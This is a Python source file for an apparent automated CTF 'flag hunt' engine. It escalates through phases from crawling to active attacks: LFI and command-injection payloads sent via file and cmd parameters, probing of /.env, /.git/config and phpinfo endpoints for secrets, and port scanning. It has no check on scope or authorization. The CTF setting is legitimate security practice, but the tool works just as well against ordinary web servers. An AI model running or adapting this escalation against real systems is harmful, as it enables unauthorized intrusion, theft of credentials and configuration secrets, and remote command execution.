"""
FLAG HUNT ENGINE - Aggressive CTF flag hunting focused on network and web.
Optimized for finding flags in CTF competitions.
"""
import asyncio
import re
from typing import Dict, List, Optional, Set, Set
from urllib.parse import urlparse, urljoin
import httpx
import socket
from concurrent.futures import ThreadPoolExecutor

from engine.attack.flag_hunter import FlagHunter
from engine.attack.crawler import AggressiveCrawler
from engine.logging.logger import get_logger


class FlagHuntEngine:
    """
    Aggressive flag hunting engine focused on:
    - Web application flag discovery
    - Network service flag discovery
    - Deep crawling for hidden flags
    - Response header/body analysis
    """
    
    def __init__(self, target: str, session: Optional[httpx.AsyncClient] = None):
        self.target = target
        self.session = session
        self.logger = get_logger()
        
        # Enhanced flag hunter
        self.flag_hunter = FlagHunter(session)
        
        # Aggressive crawler for web flag hunting
        self.crawler = AggressiveCrawler(target, session)
        
        # Extended flag patterns
        self.flag_patterns = [
            r'FLAG\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'[A-Z0-9]{32}',  # MD5-like
            r'[A-Z0-9]{40}',  # SHA1-like
            r'[A-Z0-9]{64}',  # SHA256-like
            r'[a-f0-9]{32}',  # Lowercase hex
            r'[a-f0-9]{40}',  # Lowercase hex SHA1
            r'[a-f0-9]{64}',  # Lowercase hex SHA256
            r'[A-Za-z0-9+/]{43}=',  # Base64-like
            r'[A-Za-z0-9_-]{20,}',  # Long alphanumeric strings
        ]
        
        # Common flag locations
        self.flag_locations = [
            '/flag',
            '/flag.txt',
            '/flags',
            '/flags.txt',
            '/.flag',
            '/.flags',
            '/secret',
            '/secret.txt',
            '/.secret',
            '/hidden',
            '/hidden.txt',
            '/.hidden',
            '/admin/flag',
            '/api/flag',
            '/v1/flag',
            '/v2/flag',
            '/debug/flag',
            '/test/flag',
            '/dev/flag',
            '/internal/flag',
            '/private/flag',
            '/confidential/flag',
        ]
        
        # Network ports to scan for flags
        self.flag_ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 8888, 9000, 22, 21, 25, 53, 110, 143, 993, 995]
        
        self.flags_found: Set[str] = set()
        self.network_flags: List[Dict] = []
        self.web_flags: List[Dict] = []
    
    async def hunt_flags(self) -> Dict:
        """
        NEVER-GIVE-UP flag hunting with multi-phase escalation.
        Absence of CONFIRMED flags triggers automatic escalation to riskier techniques.
        
        Returns:
            Dictionary with all found flags and escalation summary
        """
        self.logger.info(f"[FLAG HUNT] Starting NEVER-GIVE-UP flag hunt on {self.target}")
        self.logger.warning("[FLAG HUNT] Escalation mode: Absence of flags triggers deeper techniques")
        
        escalation_phase = 0
        vectors_exhausted = []
        confirmed_flags = []
        
        # PHASE 1: Passive Discovery (regex, headers, HTML, JS, comments)
        escalation_phase = 1
        self.logger.info(f"[FLAG HUNT] Phase {escalation_phase}: Passive discovery (regex, headers, HTML, JS)...")
        phase1_results = await self._phase_passive_discovery()
        vectors_exhausted.append(f"Phase {escalation_phase}: Passive discovery")
        confirmed_flags = self.flag_hunter.get_confirmed_flags()
        
        if not self.flag_hunter.has_confirmed_flag():
            self.logger.warning(f"[FLAG HUNT] Phase {escalation_phase} complete: 0 CONFIRMED flags. ESCALATING...")
            
            # PHASE 2: Aggressive Crawling (deep paths, JS mining, SPA routes)
            escalation_phase = 2
            self.logger.info(f"[FLAG HUNT] Phase {escalation_phase}: Aggressive crawling (deep paths, JS mining, SPA routes)...")
            phase2_results = await self._phase_aggressive_crawling()
            vectors_exhausted.append(f"Phase {escalation_phase}: Aggressive crawling")
            confirmed_flags = self.flag_hunter.get_confirmed_flags()
        
        if not self.flag_hunter.has_confirmed_flag():
            self.logger.warning(f"[FLAG HUNT] Phase {escalation_phase} complete: 0 CONFIRMED flags. ESCALATING...")
            
            # PHASE 3: Payload-Assisted Discovery (LFI, SSTI, RCE, SQLi-based reads)
            escalation_phase = 3
            self.logger.info(f"[FLAG HUNT] Phase {escalation_phase}: Payload-assisted discovery (LFI, SSTI, RCE, SQLi)...")
            phase3_results = await self._phase_payload_assisted_discovery()
            vectors_exhausted.append(f"Phase {escalation_phase}: Payload-assisted discovery")
            confirmed_flags = self.flag_hunter.get_confirmed_flags()
        
        if not self.flag_hunter.has_confirmed_flag():
            self.logger.warning(f"[FLAG HUNT] Phase {escalation_phase} complete: 0 CONFIRMED flags. ESCALATING...")
            
            # PHASE 4: Environment Leakage (env vars, configs, debug endpoints)
            escalation_phase = 4
            self.logger.info(f"[FLAG HUNT] Phase {escalation_phase}: Environment leakage (env vars, configs, debug endpoints)...")
            phase4_results = await self._phase_environment_leakage()
            vectors_exhausted.append(f"Phase {escalation_phase}: Environment leakage")
            confirmed_flags = self.flag_hunter.get_confirmed_flags()
        
        if not self.flag_hunter.has_confirmed_flag():
            self.logger.warning(f"[FLAG HUNT] Phase {escalation_phase} complete: 0 CONFIRMED flags. ESCALATING...")
            
            # PHASE 5: Network-Adjacent Discovery (service banners, metadata)
            escalation_phase = 5
            self.logger.info(f"[FLAG HUNT] Phase {escalation_phase}: Network-adjacent discovery (service banners, metadata)...")
            phase5_results = await self._phase_network_adjacent()
            vectors_exhausted.append(f"Phase {escalation_phase}: Network-adjacent discovery")
            confirmed_flags = self.flag_hunter.get_confirmed_flags()
        
        if not self.flag_hunter.has_confirmed_flag():
            self.logger.warning(f"[FLAG HUNT] Phase {escalation_phase} complete: 0 CONFIRMED flags. ESCALATING...")
            
            # PHASE 6: Heuristic Guessing (encoded, chunked, fragmented flags)
            escalation_phase = 6
            self.logger.info(f"[FLAG HUNT] Phase {escalation_phase}: Heuristic guessing (encoded, chunked, fragmented)...")
            phase6_results = await self._phase_heuristic_guessing()
            vectors_exhausted.append(f"Phase {escalation_phase}: Heuristic guessing")
            confirmed_flags = self.flag_hunter.get_confirmed_flags()
        
        # Final state
        escalation_summary = self.flag_hunter.get_escalation_summary()
        escalation_summary['vectors_exhausted'] = vectors_exhausted
        escalation_summary['final_phase'] = escalation_phase
        
        if not self.flag_hunter.has_confirmed_flag():
            self.logger.error("[FLAG HUNT] =========================================")
            self.logger.error("[FLAG HUNT] FLAG NOT CONFIRMED — ALL VECTORS EXHAUSTED")
            self.logger.error(f"[FLAG HUNT] Escalated through {escalation_phase} phases")
            self.logger.error(f"[FLAG HUNT] High-probability flags: {len(self.flag_hunter.get_high_probability_flags())}")
            self.logger.error(f"[FLAG HUNT] Candidate flags: {len(self.flag_hunter.get_candidate_flags())}")
            self.logger.error("[FLAG HUNT] =========================================")
        else:
            self.logger.warning(f"[FLAG HUNT] SUCCESS: {len(confirmed_flags)} CONFIRMED flag(s) found!")
        
        return {
            "target": self.target,
            "confirmed_flags": len(confirmed_flags),
            "high_probability_flags": len(self.flag_hunter.get_high_probability_flags()),
            "candidate_flags": len(self.flag_hunter.get_candidate_flags()),
            "total_flags": len(self.flag_hunter.flags_found),
            "flags": [f['flag'] for f in self.flag_hunter.flags_found.values()],
            "flag_details": list(self.flag_hunter.flags_found.values()),
            "escalation_summary": escalation_summary,
            "phase1_passive": phase1_results,
            "phase2_crawling": phase2_results if escalation_phase >= 2 else {},
            "phase3_payload": phase3_results if escalation_phase >= 3 else {},
            "phase4_environment": phase4_results if escalation_phase >= 4 else {},
            "phase5_network": phase5_results if escalation_phase >= 5 else {},
            "phase6_heuristic": phase6_results if escalation_phase >= 6 else {},
            "status": "confirmed" if self.flag_hunter.has_confirmed_flag() else "exhausted",
            "all_flags": {
                "web": self.web_flags,
                "network": self.network_flags
            }
        }
    
    async def _phase_passive_discovery(self) -> Dict:
        """Phase 1: Passive discovery (regex, headers, HTML, JS, comments)."""
        flags_found = []
        
        # 1. Check common flag locations
        self.logger.info("[FLAG HUNT] Checking common flag locations...")
        for location in self.flag_locations:
            try:
                url = urljoin(self.target, location)
                if self.session:
                    response = await self.session.get(url, timeout=5.0)
                else:
                    async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                        response = await client.get(url)
                
                if response.status_code == 200:
                    flags = await self.flag_hunter.hunt_flags(
                        response.text, 
                        url,
                        context={'source': 'static_content', 'exploitation_backed': False, 'method': 'direct_access'}
                    )
                    if flags:
                        flags_found.extend(flags)
                        self.web_flags.append({
                            "url": url,
                            "flags": flags,
                            "method": "direct_access"
                        })
                        # Only log confirmed/high-probability flags
                        confirmed = [f for f in flags if f.get('confidence') in ['CONFIRMED', 'HIGH_PROBABILITY']]
                        if confirmed:
                            self.logger.warning(f"[FLAG HUNT] Found flags at {url}: {[f['flag'] for f in confirmed]}")
            except Exception as e:
                self.logger.debug(f"[FLAG HUNT] Failed to check {location}: {e}")
        
        # 2. Response header analysis
        self.logger.info("[FLAG HUNT] Scanning response headers...")
        header_flags = await self._scan_headers()
        flags_found.extend([f['flag'] for f in header_flags.get('flags', [])])
        
        # 3. Source code analysis (JS, HTML comments)
        self.logger.info("[FLAG HUNT] Scanning source code (JS, HTML comments)...")
        source_flags = await self._scan_source_code()
        flags_found.extend([f['flag'] for f in source_flags.get('flags', [])])
        
        return {
            "flags_found": flags_found,
            "locations_checked": len(self.flag_locations),
            "flags_count": len(flags_found),
            "header_flags": header_flags,
            "source_flags": source_flags
        }
    
    async def _phase_aggressive_crawling(self) -> Dict:
        """Phase 2: Aggressive crawling (deep paths, JS mining, SPA routes)."""
        flags_found = []
        
        self.logger.info("[FLAG HUNT] Aggressive crawling for flags...")
        crawl_results = await self.crawler.crawl(max_depth=5)  # Deeper crawl for flags
        
        # Scan all discovered endpoints for flags
        endpoints = crawl_results.get("endpoints_discovered", [])
        self.logger.info(f"[FLAG HUNT] Scanning {len(endpoints)} discovered endpoints...")
        
        for endpoint in endpoints[:200]:  # Increased limit for aggressive mode
            try:
                if self.session:
                    response = await self.session.get(endpoint, timeout=5.0)
                else:
                    async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                        response = await client.get(endpoint)
                
                if response.status_code == 200:
                    flags = await self.flag_hunter.hunt_flags(
                        response.text, 
                        endpoint,
                        context={'source': 'crawl', 'exploitation_backed': False, 'method': 'crawl_discovery'}
                    )
                    if flags:
                        flags_found.extend(flags)
                        self.web_flags.append({
                            "url": endpoint,
                            "flags": flags,
                            "method": "crawl_discovery"
                        })
            except Exception as e:
                self.logger.debug(f"[FLAG HUNT] Failed to scan {endpoint}: {e}")
        
        # Deep crawl with flag-specific paths
        crawl_results = await self._deep_crawl_flags()
        flags_found.extend([f['flag'] for f in crawl_results.get('flags', [])])
        
        return {
            "flags_found": flags_found,
            "endpoints_scanned": len(endpoints),
            "flags_count": len(flags_found),
            "crawl_results": crawl_results
        }
    
    async def _phase_payload_assisted_discovery(self) -> Dict:
        """Phase 3: Payload-assisted discovery (LFI, SSTI, RCE, SQLi-based reads)."""
        self.logger.warning("[FLAG HUNT] ESCALATION: Attempting payload-assisted flag discovery")
        flags_found = []
        
        # This phase requires integration with PayloadInjector
        # For now, attempt common exploitation vectors
        from engine.attack.injector import PayloadInjector
        from engine.attack.payloads import PayloadLibrary
        
        injector = PayloadInjector(self.session, attack_mode="aggressive")
        payload_lib = PayloadLibrary()
        
        # Get LFI payloads
        lfi_payloads = payload_lib.get_payloads("lfi", "aggressive")
        
        # Try LFI on common endpoints
        common_lfi_endpoints = [
            f"{self.target}/index.php",
            f"{self.target}/page.php",
            f"{self.target}/view.php",
            f"{self.target}/file.php",
            f"{self.target}/read.php",
        ]
        
        for endpoint in common_lfi_endpoints:
            for payload_data in lfi_payloads[:5]:  # Limit to prevent timeout
                payload = payload_data.get("payload", "")
                try:
                    # Try LFI payload
                    test_url = f"{endpoint}?file={payload}"
                    if self.session:
                        response = await self.session.get(test_url, timeout=5.0)
                    else:
                        async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                            response = await client.get(test_url)
                    
                    if response.status_code == 200 and response.text:
                        # Check if file was read (not error page)
                        if any(indicator in response.text for indicator in ['root:', 'DB_PASSWORD', 'SECRET_KEY']):
                            flags = await self.flag_hunter.hunt_flags(
                                response.text,
                                test_url,
                                context={'source': 'lfi', 'exploitation_backed': True, 'payload': payload}
                            )
                            if flags:
                                flags_found.extend(flags)
                                self.logger.warning(f"[FLAG HUNT] LFI successful on {endpoint}, found flags")
                except Exception:
                    pass
        
        # Try RCE payloads
        rce_payloads = payload_lib.get_payloads("command_injection", "aggressive")
        for endpoint in common_lfi_endpoints:
            for payload_data in rce_payloads[:5]:
                payload = payload_data.get("payload", "")
                try:
                    test_url = f"{endpoint}?cmd={payload}"
                    if self.session:
                        response = await self.session.get(test_url, timeout=5.0)
                    else:
                        async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                            response = await client.get(test_url)
                    
                    if response.status_code == 200 and response.text:
                        # Check for command output
                        if any(indicator in response.text for indicator in ['uid=', 'gid=', 'www-data']):
                            flags = await self.flag_hunter.hunt_flags(
                                response.text,
                                test_url,
                                context={'source': 'rce', 'exploitation_backed': True, 'payload': payload}
                            )
                            if flags:
                                flags_found.extend(flags)
                                self.logger.warning(f"[FLAG HUNT] RCE successful on {endpoint}, found flags")
                except Exception:
                    pass
        
        return {
            "flags_found": flags_found,
            "vectors_tested": len(common_lfi_endpoints) * 5,
            "flags_count": len(flags_found)
        }
    
    async def _phase_environment_leakage(self) -> Dict:
        """Phase 4: Environment leakage (env vars, configs, debug endpoints)."""
        self.logger.warning("[FLAG HUNT] ESCALATION: Attempting environment leakage")
        flags_found = []
        
        # Debug endpoints
        debug_endpoints = [
            '/debug', '/debug.php', '/debug.php?info=1',
            '/phpinfo.php', '/phpinfo.php?info=1',
            '/.env', '/config.php', '/config.inc.php',
            '/.git/config', '/.git/HEAD',
            '/api/debug', '/api/info', '/api/status',
        ]
        
        for endpoint_path in debug_endpoints:
            try:
                url = urljoin(self.target, endpoint_path)
                if self.session:
                    response = await self.session.get(url, timeout=5.0)
                else:
                    async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                        response = await client.get(url)
                
                if response.status_code == 200:
                    flags = await self.flag_hunter.hunt_flags(
                        response.text,
                        url,
                        context={'source': 'debug_endpoint', 'exploitation_backed': False}
                    )
                    if flags:
                        flags_found.extend(flags)
            except Exception:
                pass
        
        return {
            "flags_found": flags_found,
            "endpoints_checked": len(debug_endpoints),
            "flags_count": len(flags_found)
        }
    
    async def _phase_network_adjacent(self) -> Dict:
        """Phase 5: Network-adjacent discovery (service banners, metadata)."""
        self.logger.warning("[FLAG HUNT] ESCALATION: Network-adjacent discovery")
        return await self._hunt_network_flags()
    
    async def _phase_heuristic_guessing(self) -> Dict:
        """Phase 6: Heuristic guessing (encoded, chunked, fragmented flags)."""
        self.logger.warning("[FLAG HUNT] ESCALATION: Heuristic guessing (encoded, chunked, fragmented)")
        flags_found = []
        
        # Try base64 decoding of suspicious strings
        # Try URL decoding
        # Try hex decoding
        # This is a last-resort phase
        
        return {
            "flags_found": flags_found,
            "methods_tried": ["base64_decode", "url_decode", "hex_decode"],
            "flags_count": len(flags_found)
        }
    
    
    async def _hunt_network_flags(self) -> Dict:
        """Hunt flags in network services."""
        flags_found = []
        parsed = urlparse(self.target)
        host = parsed.hostname or parsed.netloc.split(':')[0]
        
        self.logger.info(f"[FLAG HUNT] Scanning network services on {host}...")
        
        # Scan common ports for flags
        tasks = []
        for port in self.flag_ports:
            tasks.append(self._scan_port_for_flags(host, port))
        
        # Execute scans concurrently (limit to 10 at a time)
        for i in range(0, len(tasks), 10):
            batch = tasks[i:i+10]
            results = await asyncio.gather(*batch, return_exceptions=True)
            for result in results:
                if isinstance(result, dict) and result.get('flags'):
                    flags_found.extend(result['flags'])
                    self.network_flags.append(result)
        
        return {
            "flags_found": flags_found,
            "ports_scanned": len(self.flag_ports),
            "flags_count": len(flags_found)
        }
    
    async def _scan_port_for_flags(self, host: str, port: int) -> Dict:
        """Scan a specific port for flags."""
        result = {
            "host": host,
            "port": port,
            "flags": [],
            "service": "unknown"
        }
        
        try:
            # Try HTTP/HTTPS first
            if port in [80, 8080, 8000, 8888, 9000]:
                scheme = 'http'
                url = f"{scheme}://{host}:{port}"
                try:
                    if self.session:
                        response = await self.session.get(url, timeout=3.0)
                    else:
                        async with httpx.AsyncClient(verify=False, timeout=3.0) as client:
                            response = await client.get(url)
                    
                    if response.status_code == 200:
                        flags = await self.flag_hunter.hunt_flags(
                            response.text,
                            url,
                            context={'source': 'network_http', 'exploitation_backed': False, 'port': port}
                        )
                        if flags:
                            result['flags'] = flags
                            result['service'] = 'http'
                            confirmed = [f for f in flags if f.get('confidence') in ['CONFIRMED', 'HIGH_PROBABILITY']]
                            if confirmed:
                                self.logger.warning(f"[FLAG HUNT] Found flags on {host}:{port}: {[f['flag'] for f in confirmed]}")
                except Exception:
                    pass
            
            elif port in [443, 8443]:
                scheme = 'https'
                url = f"{scheme}://{host}:{port}"
                try:
                    if self.session:
                        response = await self.session.get(url, verify=False, timeout=3.0)
                    else:
                        async with httpx.AsyncClient(verify=False, timeout=3.0) as client:
                            response = await client.get(url)
                    
                    if response.status_code == 200:
                        flags = await self.flag_hunter.hunt_flags(
                            response.text,
                            url,
                            context={'source': 'network_https', 'exploitation_backed': False, 'port': port}
                        )
                        if flags:
                            result['flags'] = flags
                            result['service'] = 'https'
                            confirmed = [f for f in flags if f.get('confidence') in ['CONFIRMED', 'HIGH_PROBABILITY']]
                            if confirmed:
                                self.logger.warning(f"[FLAG HUNT] Found flags on {host}:{port}: {[f['flag'] for f in confirmed]}")
                except Exception:
                    pass
            
            # Try raw socket connection for other services
            else:
                try:
                    # Use thread pool for blocking socket operations
                    loop = asyncio.get_event_loop()
                    with ThreadPoolExecutor() as executor:
                        sock = await loop.run_in_executor(
                            executor,
                            lambda: socket.create_connection((host, port), timeout=2.0)
                        )
                        sock.close()
                        result['service'] = 'open'
                        self.logger.info(f"[FLAG HUNT] Port {port} is open on {host}")
                except Exception:
                    pass
        
        except Exception as e:
            self.logger.debug(f"[FLAG HUNT] Failed to scan {host}:{port}: {e}")
        
        return result
    
    async def _deep_crawl_flags(self) -> Dict:
        """Deep crawl with flag-focused patterns."""
        flags_found = []
        
        # Extended crawl with flag-specific paths
        flag_paths = [
            '/api/flag', '/api/flags', '/api/secret',
            '/v1/flag', '/v2/flag', '/v3/flag',
            '/admin/flag', '/admin/secret',
            '/internal/flag', '/private/flag',
            '/debug/flag', '/dev/flag',
            '/test/flag', '/staging/flag',
        ]
        
        for path in flag_paths:
            try:
                url = urljoin(self.target, path)
                if self.session:
                    response = await self.session.get(url, timeout=5.0)
                else:
                    async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                        response = await client.get(url)
                
                if response.status_code == 200:
                    flags = await self.flag_hunter.hunt_flags(
                        response.text,
                        url,
                        context={'source': 'deep_crawl', 'exploitation_backed': False, 'path': path}
                    )
                    if flags:
                        flags_found.extend(flags)
            except Exception:
                pass
        
        return {
            "flags_found": flags_found,
            "paths_checked": len(flag_paths),
            "flags_count": len(flags_found)
        }
    
    async def _scan_headers(self) -> Dict:
        """Scan HTTP headers for flags with confidence classification."""
        flags_found = []
        
        try:
            if self.session:
                response = await self.session.get(self.target)
            else:
                async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                    response = await client.get(self.target)
            
            # Check all headers for flag patterns
            for header_name, header_value in response.headers.items():
                # Headers are typically NOISE unless in specific security headers
                context = {
                    'source': 'header',
                    'exploitation_backed': False,
                    'header_name': header_name
                }
                
                # Security headers might contain flags (higher confidence)
                if header_name.lower() in ['x-flag', 'x-ctf-flag', 'flag', 'ctf-flag']:
                    context['exploitation_backed'] = True
                
                flags = await self.flag_hunter.hunt_flags(header_value, f"header:{header_name}", context)
                if flags:
                    flags_found.extend(flags)
                    # Only log confirmed/high-probability
                    confirmed = [f for f in flags if f.get('confidence') in ['CONFIRMED', 'HIGH_PROBABILITY']]
                    if confirmed:
                        self.logger.warning(f"[FLAG HUNT] Found flag in header {header_name}: {[f['flag'] for f in confirmed]}")
        
        except Exception as e:
            self.logger.debug(f"[FLAG HUNT] Header scan failed: {e}")
        
        return {
            "flags": flags_found,
            "flags_found": [f['flag'] for f in flags_found],
            "flags_count": len(flags_found)
        }
    
    async def _scan_source_code(self) -> Dict:
        """Scan JavaScript and source files for flags."""
        flags_found = []
        
        # Get JS files from crawler
        js_files = self.crawler.js_files[:20]  # Limit
        
        for js_url in js_files:
            try:
                if self.session:
                    response = await self.session.get(js_url, timeout=5.0)
                else:
                    async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
                        response = await client.get(js_url)
                
                if response.status_code == 200:
                    flags = await self.flag_hunter.hunt_flags(
                        response.text,
                        js_url,
                        context={'source': 'javascript', 'exploitation_backed': False, 'file': js_url}
                    )
                    if flags:
                        flags_found.extend(flags)
                        # Only log confirmed/high-probability
                        confirmed = [f for f in flags if f.get('confidence') in ['CONFIRMED', 'HIGH_PROBABILITY']]
                        if confirmed:
                            self.logger.warning(f"[FLAG HUNT] Found flags in JS {js_url}: {[f['flag'] for f in confirmed]}")
            except Exception as e:
                self.logger.debug(f"[FLAG HUNT] Failed to scan JS {js_url}: {e}")
        
        return {
            "flags_found": flags_found,
            "files_scanned": len(js_files),
            "flags_count": len(flags_found)
        }
